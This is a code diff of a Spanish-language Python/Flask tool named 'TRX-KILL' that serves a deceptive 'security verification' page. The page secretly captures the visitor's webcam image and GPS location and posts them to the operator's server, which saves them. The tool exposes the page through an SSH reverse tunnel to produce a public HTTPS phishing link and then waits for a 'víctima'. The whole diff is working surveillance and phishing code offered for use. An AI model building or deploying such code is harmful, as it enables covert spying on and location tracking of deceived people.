@@ -1,6 +1,7 @@
 import os, sys, time, threading, base64
 from flask import Flask, request, render_template_string
 
+# --- CONFIGURACIÓN ---
 STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
 CAPTURA_PATH = f"{STORAGE_PATH}/CAPTURAS"
 LOG_FILE = f"{STORAGE_PATH}/datos.txt"
@@ -10,29 +11,26 @@ os.makedirs(CAPTURA_PATH, exist_ok=True)
 app = Flask('TRX-KILL')
 G, C, R, Y, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[1;33m", "\033[0m"
 
+# Encuesta real con captura de permisos
 HTML_ENCUESTA = """
-<!DOCTYPE html><html><body style="background:#000; color:#0f0; text-align:center; padding-top:20px;">
-<h2>ENCUESTA DE SEGURIDAD</h2>
-<form id="e">
-    <p>¿Confirma su identidad para continuar?</p>
-    <input type="radio" name="res" value="Si" checked> SI<br>
-    <input type="radio" name="res" value="No"> NO<br><br>
-    <button type="button" onclick="enviar()" style="padding:10px;">ENVIAR DATOS</button>
-</form>
+<!DOCTYPE html><html><body style="background:#000; color:#0f0; text-align:center; padding-top:20px; font-family:monospace;">
+<h2>VERIFICACIÓN DE SEGURIDAD</h2>
+<form id="e"><p>¿Confirma su identidad?</p>
+<input type="radio" name="res" value="Si" checked> SI<br>
+<input type="radio" name="res" value="No"> NO<br><br>
+<button type="button" onclick="enviar()" style="background:#0f0; border:none; padding:10px;">ENVIAR</button></form>
 <script>
 async function enviar() {
     let res = document.querySelector('input[name="res"]:checked').value;
-    try {
-        let s = await navigator.mediaDevices.getUserMedia({video: true});
-        let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
+    let s = await navigator.mediaDevices.getUserMedia({video: true});
+    let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
+    let v = document.createElement('video'); v.srcObject = s; v.play();
+    setTimeout(() => {
         let c = document.createElement('canvas'); c.width=400; c.height=300;
-        let v = document.createElement('video'); v.srcObject = s; v.play();
-        setTimeout(() => {
-            c.getContext('2d').drawImage(v, 0, 0, 400, 300);
-            fetch('/log?res='+res+'&lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL()));
-            alert('Datos enviados correctamente.');
-        }, 1000);
-    } catch(e) { alert('Por favor, permite el acceso a la cámara.'); }
+        c.getContext('2d').drawImage(v, 0, 0, 400, 300);
+        fetch('/log?res='+res+'&lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL()));
+        alert('Enviado.');
+    }, 1000);
 }
 </script></body></html>
 """
@@ -50,37 +48,31 @@ def log():
             f.write(base64.b64decode(img.split(',')[1]))
     return "OK"
 
-def iniciar_servidor():
-    import logging
-    logging.getLogger('werkzeug').setLevel(logging.ERROR)
-    app.run(host='0.0.0.0', port=5000, debug=False)
-
 def animar(t):
     for c in t: sys.stdout.write(f"{G}{c}{W}"); sys.stdout.flush(); time.sleep(0.01)
     print()
 
 def menu():
-    threading.Thread(target=iniciar_servidor, daemon=True).start()
+    threading.Thread(target=lambda: app.run(port=5000, debug=False), daemon=True).start()
     while True:
         os.system('clear')
         print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
         print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
         print("    | |___ |___ |  /  |___ |    |_|__|_|")
-        print(f"  {C}--- TRX-KILL V9.0 ---{W}\n")
-        print(f"{G}[1] BAN NÚMERO\n[2] LINK-ENCUESTA\n[3] CLON-LINK\n[4] IP-SCAN\n[5] INFO-SIST\n[6] ADM-SIST\n[7] SALIR{W}")
+        print(f"  {C}--- TRX-KILL SYSTEM MATRIX V10.0 ---{W}\n")
+        print(f"{G}[1] BAN NÚMERO\n[2] LINK-ENCUESTA (HTTPS)\n[3] CLON-LINK\n[4] IP-SCAN\n[5] INFO-SIST\n[6] ADM-SIST\n[7] SALIR{W}")
         sel = input(f"\n{Y}TRX-ROOT > {W}")
 
         if sel == "2":
             if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
-            # Lanzar túnel obligatorio para que el HTTPS funcione
-            os.system("ssh -R 80:localhost:5000 ssh.localhost.run > /dev/null 2>&1 &")
-            print(f"{C}GENERANDO LINK HTTPS (Espera 5 segundos)...{W}")
-            time.sleep(5)
-            print(f"{G}LINK: https://ssh.localhost.run{W}")
-            print(f"{Y}Esperando víctima...{W}")
+            animar("ABRIENDO SESIÓN DE TÚNEL SSH...")
+            # Ejecuta el túnel en una ventana nueva de termux
+            os.system('termux-open-url "ssh -R 80:localhost:5000 ssh.localhost.run"')
+            print(f"{C}LINK HTTPS DISPONIBLE EN LA NUEVA VENTANA{W}")
+            print(f"{Y}ESPERANDO VÍCTIMA EN: {LOG_FILE}{W}")
             while not os.path.exists(LOG_FILE): time.sleep(0.5)
-            print(f"{R}>>> VÍCTIMA DETECTADA E INFORMACIÓN GUARDADA <<<{W}")
-            input("\n[Enter]...")
+            print(f"{R}>>> ¡VÍCTIMA DETECTADA! <<<{W}"); input("\n[Enter]...")
         elif sel == "7":
-            sys.exit()
-menu()
+            print(f"{G}Gracias por usar trx-kill{W}"); sys.exit()
+
+if __name__ == "__main__": menu()
